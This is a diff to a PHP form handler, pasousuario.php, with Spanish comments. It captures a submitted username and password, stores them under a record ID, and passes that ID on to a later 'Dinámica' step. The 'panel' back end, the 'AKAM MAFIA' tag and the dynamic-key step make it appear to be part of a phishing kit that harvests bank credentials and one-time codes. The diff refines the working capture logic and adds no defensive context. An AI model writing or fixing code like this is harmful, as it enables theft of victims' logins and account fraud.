@@ -1,5 +1,5 @@
 <?php
-// process/pasousuario.php - VERSIÓN CORREGIDA AKAM MAFIA
+// process/pasousuario.php - SIN REDIRECCIÓN INTERNA
 require('../panel/lib/funciones.php');
 session_start();
 
@@ -7,28 +7,20 @@ $user = $_POST['txt-usuario'] ?? '';
 $pass = $_POST['txt-password'] ?? ''; 
 $dispositivo = "Android Mobile"; 
 
-// Si solo te llega el usuario, es porque el script se corta antes de actualizar la clave.
-// Vamos a hacerlo de forma segura:
-
 if (!empty($user) && !empty($pass)) {
-    
-    // 1. CREAR EL REGISTRO
-    // Guardamos el ID que genera la función para poder meterle la clave
+    // 1. Creamos el registro base
     $id = crear_registro($user, $dispositivo);
     
-    // 2. ACTUALIZAR LA CLAVE (Aquí es donde fallaba)
-    // Forzamos un pequeño retraso para que al JSON le de tiempo de procesar en Railway
-    usleep(500000); // 0.5 segundos de espera
+    // 2. Agregamos la clave al mismo registro
+    // Usamos el ID devuelto para que no se cree un reporte nuevo
     actualizar_registro_pass($id, $pass);
     
-    // 3. GUARDAR ID EN SESIÓN
+    // 3. Guardamos el ID en sesión para el paso de la Dinámica
     $_SESSION['id_reg'] = $id;
     
-    // 4. RESPUESTA PARA EL JAVASCRIPT
-    // Si tu página usa AJAX ($.post), el header NO funciona. Usamos "ok".
+    // 4. Respondemos "ok" al JavaScript
     echo "ok"; 
-
 } else {
-    echo "error_datos_vacios";
+    echo "faltan_datos";
 }
 exit();
